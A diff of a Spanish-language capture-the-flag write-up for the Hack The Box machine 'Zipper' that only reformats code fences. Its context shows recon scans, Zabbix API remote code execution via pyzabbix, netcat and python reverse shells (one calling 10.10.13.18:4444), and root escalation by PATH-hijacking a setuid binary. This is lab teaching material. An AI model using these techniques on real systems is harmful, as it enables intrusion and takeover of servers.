@@ -24,7 +24,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.108
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-04 16:27 CST
 Initiating Ping Scan at 16:27
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 122.51 seconds
 
 Corroboremos con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.108
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-04 22:20:25 GMT
@@ -81,7 +81,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos nmap con los parámetros habituales para la identificación de servicios y versiones:
 
-```text
+``` text
 root@laptop:~# nmap -p22,80,10050 -n -sC -sV 10.10.10.108 --script vuln
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-04 16:35 CST
 Nmap scan report for 10.10.10.108
@@ -113,7 +113,7 @@ Una rápida googleada, no indicara que el servicio SSH no es vulnerable de acuer
 
 Lanzamos un gobuster para identificar todos los posibles archivos y directorios publicados por el servidor web:
 
-```text
+``` text
 xbytemx@laptop:~/htb/zipper$ ~/tools/gobuster -u http://10.10.10.108/ -w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
@@ -168,7 +168,7 @@ Parece que para el usuario zapper, el login vía GUI esta deshabilitado.
 
 Buscamos en searchsploit vulnerabilidades relacionadas con zabbix:
 
-```text
+``` text
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit zabbix
 -------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
  Exploit Title                                                                                                                        |  Path
@@ -199,7 +199,7 @@ Como podemos ver, existen bastantes vulnerabilidades asociadas a las diferentes 
 
 En mi caso, elegí el exploit de `Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution`, el cual tiene el siguiente código:
 
-```python
+``` python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
@@ -308,7 +308,7 @@ Ambos no requieren parámetros por lo que decidí realizar mi modificación al s
 
 # PyZabbix
 
-```python
+``` python
 #!/usr/bin/env python3
 from pyzabbix import ZabbixAPI
 
@@ -327,7 +327,7 @@ for host in zapi.host.get():
 
 El siguiente comando simplemente devuelve todos los hosts, y cada script en cada host. Su salida de ejemplo es la siguiente:
 
-```text
+``` text
 host name: Zabbix, host id: 10105
 [{'scriptid': '1', 'name': 'Ping', 'command': 'nc 10.10.13.18 4444 -e /bin/bash', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '2', 'name': 'Traceroute', 'command': '/usr/bin/traceroute {HOST.CONN} 2>&1', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '3', 'name': 'Detect operating system', 'command': 'sudo /usr/bin/nmap -O {HOST.CONN} 2>&1', 'host_access': '2', 'usrgrpid': '7', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}]
 host name: Zipper, host id: 10106
@@ -340,7 +340,7 @@ Como podemos ver tenemos dos Hosts, Zipper y Zabbix. Esto es importante, porque 
 
 Ahora que sabemos un poco mas sobre el funcionamiento de la API y conocemos más de sus parámetros, podemos crear nuestro primer script en Zipper:
 
-```python
+``` python
 #!/usr/bin/env python3
 from pyzabbix import ZabbixAPI
 
@@ -370,13 +370,13 @@ print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
 
 Como salida tendremos lo siguiente:
 
-```text
+``` text
 {'response': 'success', 'value': 'uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)\n'}
 ```
 
 Ahora, usando una de las viejas conocidas para reverse shell, cargaremos el siguiente comando para hacer una reverse shell de netcat:
 
-```python
+``` python
 #!/usr/bin/env python3
 from pyzabbix import ZabbixAPI
 
@@ -408,7 +408,7 @@ print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
 
 Bastaría con iniciar un netcat para esperar la conexión:
 
-```text
+``` text
 Shell1:
 xbytemx@laptop:~$ ncat -klvnp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
@@ -455,7 +455,7 @@ Oh, creo que estoy dentro de una instancia de docker.
 
 Estuve enumerando y enumerando la instancia de docker, hasta que me di cuenta de un detalle importantísimo de la configuración. El objeto script, tiene una propiedad especial llamada `execute_on`, la cual te permite ejecutar el script ya sea dentro del servidor de zabbix (docker) o sobre el cliente (el que tiene abierto el puerto 10050!), por lo que modificando las lineas 22 y 25 el script se ejecutará en el agente:
 
-```python
+``` python
 #!/usr/bin/env python3
 from pyzabbix import ZabbixAPI
 
@@ -487,14 +487,14 @@ print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
 
 Ahora tras ejecutarlo:
 
-```text
+``` text
 xbytemx@laptop:~/htb/zipper$ python3 get_revsh.py
 {'response': 'success', 'value': "nc: invalid option -- 'e'\nusage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]\n\t  [-m minttl] [-O length] [-P proxy_username] [-p source_port]\n\t  [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]\n\t  [-X proxy_protocol] [-x proxy_address[:port]] \t  [destination] [port]"}
 ```
 
 Esto nos indica que ha sido exitoso nuestro cambio de servidor a agente, porque como vemos la versión de netcat instalada en el agente, no soporta la opción \-e. Aquí decidí cambiar a una python reverse shell, por lo que cambiamos la variable revshell:
 
-```python
+``` python
 #!/usr/bin/env python3
 from pyzabbix import ZabbixAPI
 
@@ -526,7 +526,7 @@ print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
 
 Volvemos a ejecutar y ahora tendremos una conexión hacia el listener de `ncat`:
 
-```text
+``` text
 xbytemx@laptop:~$ ncat -nlvp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -570,7 +570,7 @@ lrwxrwxrwx   1 root   root     30 Sep  8 06:41 vmlinuz.old -> boot/vmlinuz-4.15.
 
 Exploramos un poco la máquina:
 
-```text
+``` text
 $ ls /home
 zapper
 $ ls -lah /home/zapper
@@ -607,7 +607,7 @@ echo $?
 
 Hemos dado con un script que genera backups de la carpeta utils, extraigamos el contenido de ese backup.
 
-```text
+``` text
 $ ls -lah /backups
 total 12K
 drwxrwxrwx  2 zapper zapper 4.0K Jan 10 00:07 .
@@ -671,7 +671,7 @@ mFAAAAAXBorQAQmAqQAHCwEAASMDAQEFXQAQAAAMgMYKAYhZ9rAAAA==
 
 Creamos el archivo zapper\_backup-2019-01-10.7z.b64 con el contenido anterior y decodeamos:
 
-```text
+``` text
 xbytemx@laptop:~/htb/zipper$ base64 -d zapper_backup-2019-01-10.7z.b64 > zapper_backup-2019-01-10.7z
 xbytemx@laptop:~/htb/zipper$ 7z x -ozapper20190110 -pZippityDoDah zapper_backup-2019-01-10.7z
 
@@ -703,7 +703,7 @@ backup.sh  zabbix-service
 
 Veamos vía strings el contenido de zabbix-service:
 
-```text
+``` text
 tdx
 /lib/ld-linux.so.2
 libc.so.6
@@ -811,7 +811,7 @@ Importante, vemos declarada la función setuid(), vemos que hay llamadas a syste
 
 Al ejecutarlo veremos que falla en nuestra shell, por lo que hacemos un upgrade a bash:
 
-```text
+``` text
 $ cd /home/zapper/utils
 $ ./zabbix-service
 start or stop?: [!] ERROR: Unrecognized Option
@@ -831,7 +831,7 @@ zabbix@zipper:/home/zapper/utils$
 
 Ya que tenemos un mejor control sobre los pipes, podemos realizar una escalación de privilegios porque los comandos ejecutados desde el binario zabbix\-service confían en la variable PATH, por lo que cambiando la variable PATH y suplantando el binario systemctl por cualquier cosa, podemos ejecutar cualquier cosa como root (gracias setuid 0). En este caso lo sustituimos por un script de bash:
 
-```text
+``` text
 zabbix@zipper:/home/zapper/utils$ printf '#!/bin/bash\n\n/bin/bash -i' > /tmp/systemctl
 <intf '#!/bin/bash\n\n/bin/bash -i' > /tmp/systemctl
 zabbix@zipper:/home/zapper/utils$ chmod +x /tmp/systemctl
